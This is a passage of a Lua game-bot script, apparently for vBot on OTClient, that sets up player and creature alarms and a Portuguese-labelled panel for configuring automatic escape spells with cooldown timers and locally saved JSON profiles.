local configName = modules.game_bot.contentsPanel.config:getCurrentOption().text


  
setDefaultTab("Main")

local qqcoisa = addLabel("CONFIG", "Outfit Bijuu:")
qqcoisa:setFont("verdana-11px-rounded")
qqcoisa:setColor("orange")

UI.TextEdit(storage.outfitBijuu or "302", function(widget, text)
	storage.outfitBijuu = tonumber(text)
end)

local panelName = "alarms"
local ui = setupUI([[
Panel
  height: 200

  BotSwitch
    id: title
    anchors.top: parent.top
    anchors.left: parent.left
    text-align: center
    margin-top: 2
    width: 130
    !text: tr('Alarms')
    color: white

  Button
    id: alerts
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 3
    height: 17
    text: Edit
    color: white

]])
ui:setId(panelName)

if not storage[panelName] then
  storage[panelName] = {
    enabled = false,
    playerAttack = false,
    playerDetected = false,
    playerDetectedLogout = false,
    creatureDetected = false,
    healthBelow = false,
    healthValue = 40,
    manaBelow = false,
    manaValue = 50,
    privateMessage = false,
    ignoreFriends = true,
    warnBoss = false,
    bossName = '[B]'
}
end



local config = storage[panelName]

ui.title:setOn(config.enabled)
ui.title.onClick = function(widget)
config.enabled = not config.enabled
widget:setOn(config.enabled)
end

-- new var's validation
config.messageText = config.messageText or ""
config.bossName = config.bossName or ""

rootWidget = g_ui.getRootWidget()
if rootWidget then
  alarmsWindow = UI.createWindow('AlarmsWindow', rootWidget)
  alarmsWindow:hide()

  alarmsWindow.closeButton.onClick = function(widget)
    alarmsWindow:hide()
  end

  alarmsWindow.playerAttack:setOn(config.playerAttack)
  alarmsWindow.playerAttack.onClick = function(widget)
    config.playerAttack = not config.playerAttack
    widget:setOn(config.playerAttack)
  end

  alarmsWindow.playerDetected:setOn(config.playerDetected)
  alarmsWindow.playerDetected.onClick = function(widget)
    config.playerDetected = not config.playerDetected
    widget:setOn(config.playerDetected)
  end

  alarmsWindow.playerDetectedLogout:setChecked(config.playerDetectedLogout)
  alarmsWindow.playerDetectedLogout.onClick = function(widget)
    config.playerDetectedLogout = not config.playerDetectedLogout
    widget:setChecked(config.playerDetectedLogout)
  end

  alarmsWindow.creatureDetected:setOn(config.creatureDetected)
  alarmsWindow.creatureDetected.onClick = function(widget)
    config.creatureDetected = not config.creatureDetected
    widget:setOn(config.creatureDetected)
  end

  alarmsWindow.healthBelow:setOn(config.healthBelow)
  alarmsWindow.healthBelow.onClick = function(widget)
    config.healthBelow = not config.healthBelow
    widget:setOn(config.healthBelow)
  end

  alarmsWindow.healthValue.onValueChange = function(scroll, value)
    config.healthValue = value
    alarmsWindow.healthBelow:setText("Health < " .. config.healthValue .. "%")  
  end
  alarmsWindow.healthValue:setValue(config.healthValue)

  alarmsWindow.manaBelow:setOn(config.manaBelow)
  alarmsWindow.manaBelow.onClick = function(widget)
    config.manaBelow = not config.manaBelow
    widget:setOn(config.manaBelow)
  end

  alarmsWindow.manaValue.onValueChange = function(scroll, value)
    config.manaValue = value
    alarmsWindow.manaBelow:setText("Mana < " .. config.manaValue .. "%")  
  end
  alarmsWindow.manaValue:setValue(config.manaValue)

  alarmsWindow.privateMessage:setOn(config.privateMessage)
  alarmsWindow.privateMessage.onClick = function(widget)
    config.privateMessage = not config.privateMessage
    widget:setOn(config.privateMessage)
  end

  alarmsWindow.ignoreFriends:setOn(config.ignoreFriends)
  alarmsWindow.ignoreFriends.onClick = function(widget)
    config.ignoreFriends = not config.ignoreFriends
    widget:setOn(config.ignoreFriends)
  end

  alarmsWindow.warnBoss:setOn(config.warnBoss)
  alarmsWindow.warnBoss.onClick = function(widget)
    config.warnBoss = not config.warnBoss
    widget:setOn(config.warnBoss)
  end

  alarmsWindow.bossName:setText(config.bossName)
  alarmsWindow.bossName.onTextChange = function(widget, text)
    config.bossName = text
  end

  alarmsWindow.warnMessage:setOn(config.warnMessage)
  alarmsWindow.warnMessage.onClick = function(widget)
    config.warnMessage = not config.warnMessage
    widget:setOn(config.warnMessage)
  end

  alarmsWindow.messageText:setText(config.messageText)
  alarmsWindow.messageText.onTextChange = function(widget, text)
    config.messageText = text
  end

  local pName = player:getName()
  onTextMessage(function(mode, text)
    if config.enabled and config.playerAttack and string.match(text, "hitpoints due to an attack") and not string.match(text, "hitpoints due to an attack by a ") then
      playSound("/sounds/Player_Attack.ogg")
      g_window.setTitle(pName .. " - Player Attacks!")
      return
    end

    if config.warnMessage and config.messageText:len() > 0 then
      text = text:lower()
      local parts = string.split(config.messageText, ",")
      for i=1,#parts do
        local part = parts[i]
        part = part:trim()
        part = part:lower()

        if text:find(part) then
          delay(1500)
          playSound(g_resources.fileExists("/sounds/Special_Message.ogg") and "/sounds/Special_Message.ogg" or "/sounds/Private_Message.ogg")
          g_window.setTitle(pName .. " - Special Message Detected: "..part)
          return
        end
      end
    end
  end)

  macro(100, function()
    if not config.enabled then
      return
    end
    local specs = getSpectators()
    if config.playerDetected then
      for _, spec in ipairs(specs) do
        if spec:isPlayer() and spec:getName() ~= name() then
          local specPos = spec:getPosition()
          if (not config.ignoreFriends or not isFriend(spec)) and math.max(math.abs(posx()-specPos.x), math.abs(posy()-specPos.y)) <= 8 then
            playSound("/sounds/Player_Detected.ogg")
            delay(1500)
            g_window.setTitle(pName .. " - Player Detected! "..spec:getName())
            if config.playerDetectedLogout then
              modules.game_interface.tryLogout(false)
            end
            return
          end
        end
      end
    end

    if config.creatureDetected then
      for _, spec in ipairs(specs) do
        if not spec:isPlayer() then
          local specPos = spec:getPosition()
          if math.max(math.abs(posx()-specPos.x), math.abs(posy()-specPos.y)) <= 8 then
            playSound("/sounds/Creature_Detected.ogg")
            delay(1500)
            g_window.setTitle(pName .. " - Creature Detected! "..spec:getName())
            return
          end
        end
      end
    end

    if config.warnBoss then
      -- experimental, but since we check only names i think the best way would be to combine all spec's names into one string and then check it to avoid multiple loops
      if config.bossName:len() > 0 then
        local names = string.split(config.bossName, ",")
        local combinedString = ""
        for _, spec in ipairs(specs) do
          local specPos = spec:getPosition()
          if math.max(math.abs(posx() - specPos.x), math.abs(posy() - specPos.y)) <= 8 then
            local name = spec:getName():lower()
            -- add special sign between names to avoid unwanted combining mistakes
            combinedString = combinedString .."&"..name
          end
        end
        for i=1,#names do
          local name = names[i]
          name = name:trim()
          name = name:lower()

          if combinedString:find(name) then
            playSound(g_resources.fileExists("/sounds/Special_Creature.ogg") and "/sounds/Special_Creature.ogg" or "/sounds/Creature_Detected.ogg")
            delay(1500)
            g_window.setTitle(pName .. " - Special Creature Detected: "..name)
            return
          end

        end
      end
    end

    if config.healthBelow then
      if hppercent() <= config.healthValue then
        playSound("/sounds/Low_Health.ogg")
        delay(1500)
        g_window.setTitle(pName .. " - Low Health! only: "..hppercent().."%")
        return
      end
    end

    if config.manaBelow then
      if manapercent() <= config.manaValue then
        playSound("/sounds/Low_Mana.ogg")
        delay(1500)
        g_window.setTitle(pName .. " - Low Mana! only: "..manapercent().."%")
        return
      end
    end
  end)

  onTalk(function(name, level, mode, text, channelId, pos)
    if mode == 4 and config.enabled and config.privateMessage then
      playSound("/sounds/Private_Message.ogg")
      g_window.setTitle(pName .. " - Private Message from: " .. name)
      return
    end
  end)
end

ui.alerts.onClick = function(widget)
  alarmsWindow:show()
  alarmsWindow:raise()
  alarmsWindow:focus()
end


--------------------------------------------------



scriptFuncs = {};
fugaSpellsWidgets = {};

scriptFuncs.readProfile = function(filePath, callback)
  if g_resources.fileExists(filePath) then
      local status, result = pcall(function()
          return json.decode(g_resources.readFileContents(filePath))
      end)
      if not status then
          return onError("Erro carregando arquivo (" .. filePath .. "). Para consertar o problema, exclua o arquivo. Detalhes: " .. result)
      end

      callback(result);
  end
end

scriptFuncs.saveProfile = function(configFile, content)
  local status, result = pcall(function()
      return json.encode(content, 2)
  end);

  if not status then
      return onError("Erro salvando configuração. Detalhes: " .. result);
  end

  if result:len() > 100 * 1024 * 1024 then
      return onError("Arquivo de configuração acima de 100MB, não será salvo.");
  end

  g_resources.writeFileContents(configFile, result);
end

storageProfiles = {
  fugaSpells = {},
  keySpells = {}
}

MAIN_DIRECTORY = "/bot/" .. modules.game_bot.contentsPanel.config:getCurrentOption().text .. "/storage/"
STORAGE_DIRECTORY = "" .. MAIN_DIRECTORY .. g_game.getWorldName() .. '.json';


if not g_resources.directoryExists(MAIN_DIRECTORY) then
  g_resources.makeDir(MAIN_DIRECTORY);
end

scriptFuncs.readProfile(STORAGE_DIRECTORY, function(result)
  storageProfiles = result
  if (type(storageProfiles.fugaSpells) ~= 'table') then
      storageProfiles.fugaSpells = {};
  end
  if (type(storageProfiles.keySpells) ~= 'table') then
      storageProfiles.keySpells = {};
  end
end);


scriptFuncs.reindexTable = function(t)
  if not t or type(t) ~= "table" then return end

  local i = 0
  for _, e in pairs(t) do
      i = i + 1
      e.index = i
  end
end

firstLetterUpper = function(str)
  return (str:gsub("(%a)([%w_']*)", function(first, rest) return first:upper()..rest:lower() end))
end

function formatTime(seconds)
  if seconds < 60 then
      return seconds .. 's'
  else
      local minutes = math.floor(seconds / 60)
      local remainingSeconds = seconds % 60
      return string.format("%dm %02ds", minutes, remainingSeconds)
  end
end


formatRemainingTime = function(time)
  local remainingTime = (time - now) / 1000;
  local timeText = '';
  timeText = string.format("%.0f", (time - now) / 1000).. "s";
  return timeText;
end


attachSpellWidgetCallbacks = function(widget, spellId, table)
  widget.onDragEnter = function(self, mousePos)
      if not modules.corelib.g_keyboard.isCtrlPressed() then
          return false
      end
      self:breakAnchors()
      self.movingReference = { x = mousePos.x - self:getX(), y = mousePos.y - self:getY() }
      return true
  end

  widget.onDragMove = function(self, mousePos, moved)
      local parentRect = self:getParent():getRect()
      local newX = math.min(math.max(parentRect.x, mousePos.x - self.movingReference.x), parentRect.x + parentRect.width - self:getWidth())
      local newY = math.min(math.max(parentRect.y - self:getParent():getMarginTop(), mousePos.y - self.movingReference.y), parentRect.y + parentRect.height - self:getHeight())
      self:move(newX, newY)
      if table[spellId] then
          table[spellId].widgetPos = {x = newX, y = newY}
          scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles)
      end
      return true
  end

  widget.onDragLeave = function(self, pos)
      return true
  end
end
--[[
function toMoveUp(window, table)
  local action = window.spellList:getFocusedChild();
  if (not action) then return; end
  local index = window.spellList:getChildIndex(action);
  if (index < 2) then return; end
  window.spellList:moveChildToIndex(action, index - 1);
  window.spellList:ensureChildVisible(action);
  table[index].index = index - 1;
  table[index - 1].index = index;
  table.sort(table, function(a,b) return a.index < b.index end)
  scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end

function toMoveDown(window, table)
  local action = window.spellList:getFocusedChild();
  if (not action) then return; end
  local index = window.spellList:getChildIndex(action);
  if (index < 2) then return; end
  window.spellList:moveChildToIndex(action, index - 1);
  window.spellList:ensureChildVisible(action);
  table[index].index = index - 1;
  table[index - 1].index = index;
  table.sort(table, function(a,b) return a.index < b.index end)
  scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end
]]--

function stopToCast()
  local selfHealth, hpEscape = g_game.getLocalPlayer():getHealthPercent(), ct()
  for index, value in ipairs(storageProfiles.fugaSpells) do
      if value.enabled and value.activeCooldown and value.activeCooldown >= now then return true; end
      if selfHealth <= hpEscape + 5 then
          if (not value.totalCooldown or value.totalCooldown <= now) then
              return true;
          end
      end
  end
  return false;
end

function isAnySelectedKeyPressed()
  for index, value in ipairs(storageProfiles.keySpells) do
      if value.enabled and (modules.corelib.g_keyboard.isKeyPressed(value.keyPress)) then
          return true;
      end
  end
  return false;
end 

function canCastFuga()
  for key, value in ipairs(storageProfiles.fugaSpells) do
      local isLifesActive = (value.activeCooldown and value.activeCooldown >= now) and (value.enableLifes and value.lifes > 0);
      local isMultipleActive = value.enableMultiple and value.count > 0 ;
      local isNormalActive = value.activeCooldown and value.activeCooldown >= now;
      if (isLifesActive or isNormalActive) then
          return true;
      end
  end
  return false;
end

function resetCooldowns()
    if storageProfiles then
        if storageProfiles.fugaSpells then
            for _, spell in ipairs(storageProfiles.fugaSpells) do
                spell.totalCooldown = nil;
                spell.activeCooldown = nil;
            end
        end
     end
end

scriptFuncs.readProfile(STORAGE_DIRECTORY, function(result)
    storageProfiles = result;
    if (type(storageProfiles.fugaSpells) ~= 'table') then
        storageProfiles.fugaSpells = {};
    end
    if (type(storageProfiles.keySpells) ~= 'table') then
        storageProfiles.keySpells = {};
    end
    resetCooldowns();
end);

scriptFuncs.reindexTable = function(t)
    if not t or type(t) ~= "table" then return end

    local i = 0
    for _, e in pairs(t) do
        i = i + 1
        e.index = i
    end
end

firstLetterUpper = function(str)
    return (str:gsub("(%a)([%w_']*)", function(first, rest) return first:upper()..rest:lower() end))
end

storage['iconScripts'] = storage['iconScripts'] or {
    fugaMacro = false,
    showInfos = false,
    keyMacro = false
}

local isOn = storage['iconScripts'];

function removeTable(tbl, index)
    table.remove(tbl, index)
end

forceSay = function(t)
    if type(t) ~= 'table' then
        for i = 0, 10 do
            stopCombo = now + 250;
            return say(t)
        end
    end
    for i = 0, 10 do
        stopCombo = now + 250;
        return say(t.toSay or t.text)
    end
end


local spellEntry = [[
UIWidget
  background-color: alpha
  text-offset: 18 0
  focusable: true
  height: 16

  CheckBox
    id: enabled
    anchors.left: parent.left
    anchors.verticalCenter: parent.verticalCenter
    width: 15
    height: 15
    margin-top: 2
    margin-left: 3
    image-source: /images/ui/checkbox_round

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: #FF4500
  
    $checked:
      image-color: #FF4500
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false

  $focus:
    background-color: 
    opacity: 0.4

  CheckBox
    id: showTimespell
    anchors.left: enabled.left
    anchors.verticalCenter: parent.verticalCenter
    width: 15
    height: 15
    margin-top: 2
    margin-left: 15
    image-source: /images/ui/checkbox_round

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: #FF4500
  
    $checked:
      image-color: #FF4500
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false

  $focus:
    background-color: gray		
    opacity: 0.9


  Label
    id: textToSet
    anchors.left: showTimespell.left
    anchors.verticalCenter: parent.verticalCenter
    margin-left: 20

  Button
    id: remove
    !text: tr('x')
    color: #FF4500
    anchors.right: parent.right
    margin-right: 15
    width: 15
    height: 15
    tooltip: Remove Spell
]]

local widgetConfig = [[
UIWidget
  background-color: black
  font: verdana-11px-rounded
  opacity: 0.70
  padding: 0 5
  focusable: true
  phantom: false
  draggable: true
  text-auto-resize: true
]]

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

fugaIcon = setupUI([[
Panel
  height: 20
  BotSwitch
    id: title
    anchors.top: parent.top
    anchors.horizontalCenter: parent.horizontalCenter
    margin-top: 4
    margin-left: 0
    text-align: center
    width: 160
    height: 17
    text: Fugas
    color: white
    font: verdana-11px-rounded

  Button
    id: settings
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-top: -18
    margin-left: -135
    margin-right: 30
    width: 20
    height: 17
    text: Painel Fugas
    color: orange
    font: verdana-11px-rounded

]])

fugaInterface = setupUI([[
UIWindow
  text: Fugas Panel
  size: 520 340
  image-source: "/bot/vBot_4.8/imagens/fundinho.png"
  font: sans-bold-16px
  color: white
  background-color: black
  opacity: 0.80
  anchors.centerIn: parent
  
  Panel
    anchors.top: parent.top
    anchors.right: sep2.left
    anchors.left: parent.left
    anchors.bottom: separator.top
    margin: 30 20 15 11
    image-border: 6
    background-color: 
    opacity: 0.75
    padding: 3
    size: 320 235

  Panel
    anchors.top: parent.top
    anchors.left: sep2.left
    anchors.right: parent.right
    anchors.bottom: separator.top
    margin: 30 20 15 11
    image-border: 6
    background-color: 
    opacity: 0.75
    padding: 3
    size: 320 235

  TextList
    id: spellList
    anchors.left: parent.left
    anchors.top: parent.top
    padding: 1
    size: 480 125 
    margin-top: 170
    margin-left: 18
    vertical-scrollbar: spellListScrollBar
    background-color: 
    opacity: 0.90
    
  VerticalScrollBar
    id: spellListScrollBar
    anchors.top: spellList.top
    anchors.bottom: spellList.bottom
    anchors.right: spellList.right
    step: 14
    pixels-scroll: true

  Button
    id: moveUp
    anchors.bottom: parent.bottom
    anchors.horizontalCenter: parent.horizontalCenter
    margin-bottom: 185
    margin-left: 15
    text: /\
    size: 20 20
    font: verdana-11px-rounded

  Button
    id: moveDown
    anchors.bottom: parent.bottom
    anchors.left: moveUp.left
    margin-bottom: 185
    margin-left: 25
    text: \/
    size: 20 20
    font: verdana-11px-rounded



  Label
    id: castSpellLabel
    anchors.left: castSpell.left
    anchors.top: parent.top
    text: Magia:
    font: verdana-11px-rounded
    margin-top: 36
    margin-left: -43
    color: white

  TextEdit
    id: castSpell
    anchors.left: spellList.left
    anchors.top: parent.top
    margin-left: 52
    margin-top: 33
    width: 150
    background-color: white

  Label
    id: orangeSpellLabel
    anchors.left: orangeSpell.left
    anchors.top: parent.top
    text: Orange Msg: 
    font: verdana-11px-rounded
    margin-top: 66
    margin-left: -78
    color: white

  TextEdit
    id: orangeSpell
    anchors.left: spellList.left
    anchors.top: parent.top
    margin-top: 63
    margin-left: 86
    width: 115
    background-color: white

  CheckBox
    id: sameSpell
    anchors.left: orangeSpellLabel.right
    anchors.top: parent.top
    margin-top: 66
    margin-left: 130
    image-source: /images/ui/checkbox_round
    tooltip: Orange Spell = Cast Spell?

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: white
  
    $checked:
      image-color: white
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false

  Label
    id: onScreenLabel
    anchors.left: orangeSpell.left
    anchors.top: parent.top
    text: Screen:
    font: verdana-11px-rounded
    margin-top: 96
    margin-left: -77
    color: white

  TextEdit
    id: onScreen
    anchors.left: spellList.left
    anchors.top: parent.top
    margin-left: 62
    margin-top: 93
    width: 140
    background-color: white

  Label
    id: hppercentLabel
    anchors.left: hppercent.left
    anchors.top: parent.top
    margin-top: 32
    margin-left: -85
    text: Porcentagem:
    font: verdana-11px-rounded
    color: white

  HorizontalScrollBar
    id: hppercent
    anchors.left: spellList.left
    margin-left: 335
    anchors.top: parent.top
    margin-top: 33
    width: 138
    minimum: 0
    maximum: 100
    step: 1

  Label
    id: cooldownTotalLabel
    anchors.left: hppercent.left
    anchors.top: parent.top
    margin-top: 65
    margin-left: -85
    text: Tempo Total:
    font: verdana-11px-rounded
    color: white

  HorizontalScrollBar
    id: cooldownTotal
    anchors.left: spellList.left
    margin-left: 335
    anchors.top: parent.top
    margin-top: 65
    width: 138
    minimum: 0
    maximum: 180
    step: 1

  Label
    id: cooldownActiveLabel
    anchors.left: hppercent.left
    anchors.top: parent.top
    margin-top: 100
    margin-left: -85
    text: Tempo Ativo:
    font: verdana-11px-rounded
    color: white

  HorizontalScrollBar
    id: cooldownActive
    anchors.left: spellList.left
    margin-left: 335
    anchors.top: parent.top
    margin-top: 100
    width: 138
    minimum: 0
    maximum: 180
    step: 1

  Label
    id: textrevive
    anchors.bottom: parent.bottom
    anchors.horizontalCenter: parent.horizontalCenter
    text: TIPOS DE FUGAS:
    font: cipsoftFont
    margin-bottom: 195
    margin-left: -188
    color: red

  Label
    id: textrevive
    anchors.bottom: parent.bottom
    anchors.horizontalCenter: parent.horizontalCenter
    text: REVIVE:           LIFES:           MULTIPLE:
    font: verdana-11px-rounded
    margin-bottom: 183
    margin-left: -120
    color: white

  CheckBox
    id: reviveOption
    anchors.bottom: parent.bottom
    anchors.horizontalCenter: parent.horizontalCenter
    margin-bottom: 182
    margin-left: -180
    image-source: /images/ui/checkbox_round
    tooltip: Fuga de Reviver [ex: izanagi]

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: white
  
    $checked:
      image-color: white
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false

  CheckBox
    id: lifesOption
    anchors.bottom: parent.bottom
    anchors.left: reviveOption.right
    margin-bottom: 182
    margin-left: 55
    image-source: /images/ui/checkbox_round
    tooltip: Fuga de Vidas [ex: Jiongu no Jutsu]

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: white
  
    $checked:
      image-color: white
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false

  CheckBox
    id: multipleOption
    anchors.bottom: parent.bottom
    anchors.left: lifesOption.right
    margin-bottom: 182
    margin-left: 79
    image-source: /images/ui/checkbox_round
    tooltip: Fuga de Diversos Scapes [ex: Bangata Karasu]

    $hover !disabled:
      image-color: white
  
    $!checked:
      image-color: white
  
    $checked:
      image-color: white
  
    $disabled:
      image-color: #dfdfdf88
      color: #dfdfdf88
      opacity: 0.8
      change-cursor-image: false


  SpinBox
    id: lifesValue
    anchors.bottom: parent.bottom
    anchors.left: lifesOption.right
    margin-bottom: 182
    margin-left: 5
    size: 20 20
    minimum: 0
    maximum: 10
    step: 1
    editable: true
    focusable: true

  Button
    id: insertSpell
    text: Adicionar
    font: verdana-11px-rounded
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    size: 175 20
    margin-bottom: 185
    margin-right: 30

  UIButton
    id: closeButton
    !text: tr('   X   ')
    color: red
    font: sans-bold-16px
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    size: 45 21
    margin-right: 15
    margin-bottom: 20

      
]], g_ui.getRootWidget())
fugaInterface:hide();

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


keyInterface = setupUI([[
MainWindow
  text: Fuga Panel
  size: 300 400

  Panel
    image-source: /images/ui/panel_flat
    anchors.right: parent.right
    anchors.left: parent.left
    anchors.top: parent.top
    anchors.bottom: separator.top
    margin: 5 5 5 5
    image-border: 6
    padding: 3
    size: 320 235

  TextList
    id: spellList
    anchors.horizontalCenter: parent.horizontalCenter
    anchors.top: parent.top
    padding: 1
    size: 240 215  
    margin-top: 11
    vertical-scrollbar: spellListScrollBar

  Label
    id: castSpellLabel
    anchors.right: parent.right
    anchors.bottom: castSpell.top
    text: Spell Name
    margin-bottom: 5
    margin-right: 75

  TextEdit
    id: castSpell
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    margin-bottom: 60
    margin-right: 14
    width: 125

  Label
    id: keyLabel
    anchors.left: parent.left
    anchors.bottom: castSpell.top
    text: Key
    margin-bottom: 5
    margin-left: 15

  TextEdit
    id: key
    anchors.left: parent.left
    anchors.bottom: parent.bottom
    margin-bottom: 60
    margin-left: 14
    width: 70
    editable: false

  VerticalScrollBar
    id: spellListScrollBar
    anchors.top: spellList.top
    anchors.bottom: spellList.bottom
    anchors.right: spellList.right
    step: 14
    pixels-scroll: true

  Button
    id: insertKey
    text: Insert Key
    font: cipsoftFont
    anchors.right: parent.right
    anchors.bottom: parent.bottom
    size: 60 25
    margin-right: 5
    margin-bottom: 5

  HorizontalSeparator
    id: separator
    anchors.right: parent.right
    anchors.left: parent.left
    anchors.bottom: closeButton.top
    margin-bottom: 5

  Button
    id: closeButton
    !text: tr('Close')
    font: cipsoftFont
    anchors.left: parent.left
    anchors.bottom: parent.bottom
    size: 45 25
    margin-left: 4
    margin-bottom: 5
      
]], g_ui.getRootWidget())
keyInterface:hide();

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

fugaIcon.title:setOn(isOn.fugaMacro);
fugaIcon.title.onClick = function(widget)
    isOn.fugaMacro = not isOn.fugaMacro;
    widget:setOn(isOn.fugaMacro);
    scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end

fugaIcon.settings.onClick = function(widget)
    if not fugaInterface:isVisible() then
        fugaInterface:show();
        fugaInterface:raise();
        fugaInterface:focus();
    else
        fugaInterface:hide();
        scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
    end
end

fugaInterface.closeButton.onClick = function(widget)
    fugaInterface:hide();
    scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

fugaInterface.hppercent:setText('0%')
fugaInterface.hppercent.onValueChange = function(widget, value)
    widget:setText(value .. '%')
end

fugaInterface.cooldownTotal:setText('0s')
fugaInterface.cooldownTotal.onValueChange = function(widget, value)
    local formattedTime = formatTime(value)
    widget:setText(value .. 's')
    --widget:setText(formattedTime)
end

fugaInterface.cooldownActive:setText('0s')
fugaInterface.cooldownActive.onValueChange = function(widget, value)
    local formattedTime = formatTime(value)
    widget:setText(value .. 's')
    --widget:setText(formattedTime)
end


fugaInterface.sameSpell:setChecked(true);
fugaInterface.orangeSpell:setEnabled(false);
fugaInterface.sameSpell.onCheckChange = function(widget, checked)
    if checked then
        fugaInterface.orangeSpell:setEnabled(false)
    else
        fugaInterface.orangeSpell:setEnabled(true)
        fugaInterface.orangeSpell:setText(fugaInterface.castSpell:getText())
    end
end

fugaInterface.lifesValue:hide();
fugaInterface.lifesOption.onCheckChange = function(self, checked)
    if checked then
        fugaInterface.multipleOption:hide();
        fugaInterface.lifesValue:show();
    else
        fugaInterface.multipleOption:show();
        fugaInterface.lifesValue:hide();
    end
end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function refreshFugaList(list, table)
    if table then
        for i, child in pairs(list.spellList:getChildren()) do
            child:destroy();
        end
        for _, widget in pairs(fugaSpellsWidgets) do
            widget:destroy();
        end
        for index, entry in ipairs(table) do
            local label = setupUI(spellEntry, list.spellList)
            local newWidget = setupUI(widgetConfig, g_ui.getRootWidget())
            newWidget:setText(firstLetterUpper(entry.spellCast))
            attachSpellWidgetCallbacks(newWidget, entry.index, storageProfiles.fugaSpells)
  
            if not entry.widgetPos then
                entry.widgetPos = {x = 0, y = 50}
            end
            if entry.enableTimeSpell then
              newWidget:show();
            else
              newWidget:hide();
            end
            newWidget:setPosition(entry.widgetPos)
            fugaSpellsWidgets[entry.index] = newWidget;
            label.onDoubleClick = function(widget)
                local spellTable = entry;
                list.castSpell:setText(spellTable.spellCast);
                list.orangeSpell:setText(spellTable.orangeSpell);
                list.onScreen:setText(spellTable.onScreen);
                list.hppercent:setValue(spellTable.selfHealth);
                list.cooldownTotal:setValue(spellTable.cooldownTotal);
                list.cooldownActive:setValue(spellTable.cooldownActive);
                for i, v in ipairs(storageProfiles.fugaSpells) do
                    if v == entry then
                        removeTable(storageProfiles.fugaSpells, i)
                    end
                end
                scriptFuncs.reindexTable(table);
                newWidget:destroy();
                label:destroy();
            end
            label.enabled:setChecked(entry.enabled);
            label.enabled:setTooltip(not entry.enabled and 'Enable Spell' or 'Disable Spell');
            label.enabled.onClick = function(widget)
                entry.enabled = not entry.enabled;
                label.enabled:setChecked(entry.enabled);
                label.enabled:setTooltip(not entry.enabled and 'Enable Spell' or 'Disable Spell');
                scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
            end
            label.showTimespell:setChecked(entry.enableTimeSpell)
            label.showTimespell:setTooltip(not entry.enableTimeSpell and 'Enable Time Spell' or 'Disable Time Spell');
            label.showTimespell.onClick = function(widget)
                entry.enableTimeSpell = not entry.enableTimeSpell;
                label.showTimespell:setChecked(entry.enableTimeSpell);
                label.showTimespell:setTooltip(not entry.enableTimeSpell and 'Enable Time Spell' or 'Disable Time Spell');
                if entry.enableTimeSpell then
                    newWidget:show();
                else
                    newWidget:hide();
                end
                scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
            end
            label.remove.onClick = function(widget)
                for i, v in ipairs(storageProfiles.fugaSpells) do
                    if v == entry then
                        removeTable(storageProfiles.fugaSpells, i)
                    end
                end
                scriptFuncs.reindexTable(table);
                newWidget:destroy();
                label:destroy();
            end
            label.onClick = function(widget)
                fugaInterface.moveDown:show();
                fugaInterface.moveUp:show();
            end
            label.textToSet:setText(firstLetterUpper('Jutsu: '.. entry.spellCast .. ' | Percent: ' .. entry.selfHealth .. '% | CD Total: ' .. entry.cooldownTotal.. ' | CD Ativo: ' .. entry.cooldownActive .. ''));
	    label.textToSet:setColor("white")
	    label.textToSet:setFont("verdana-11px-rounded")
            label:setTooltip('On Screen: ' .. entry.onScreen .. '')
        end
    end
  end
  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

fugaInterface.moveUp.onClick = function()
  local action = fugaInterface.spellList:getFocusedChild();
  if (not action) then return; end
  local index = fugaInterface.spellList:getChildIndex(action);
  if (index < 2) then return; end
  fugaInterface.spellList:moveChildToIndex(action, index - 1);
  fugaInterface.spellList:ensureChildVisible(action);
  storageProfiles.fugaSpells[index].index = index - 1;
  storageProfiles.fugaSpells[index - 1].index = index;
  table.sort(storageProfiles.fugaSpells, function(a,b) return a.index < b.index end)
  scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end

fugaInterface.moveDown.onClick = function()
  local action = fugaInterface.spellList:getFocusedChild()
  if not action then return; end
  local index = fugaInterface.spellList:getChildIndex(action)
  if index >= fugaInterface.spellList:getChildCount() then return end
  fugaInterface.spellList:moveChildToIndex(action, index + 1);
  fugaInterface.spellList:ensureChildVisible(action);
  storageProfiles.fugaSpells[index].index = index + 1;
  storageProfiles.fugaSpells[index + 1].index = index;
  table.sort(storageProfiles.fugaSpells, function(a,b) return a.index < b.index end)
  scriptFuncs.saveProfile(STORAGE_DIRECTORY, storageProfiles);
end

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

fugaInterface.insertSpell.onClick = function(widget)
    local spellName = fugaInterface.castSpell:getText():trim();
    local orangeMsg = fugaInterface.orangeSpell:getText():trim();
    local onScreen = fugaInterface.onScreen:getText();
    orangeMsg = (orangeMsg:len() == 0) and spellName or orangeMsg;
    local hppercent = fugaInterface.hppercent:getValue();
    local cooldownTotal = fugaInterface.cooldownTotal:getValue();
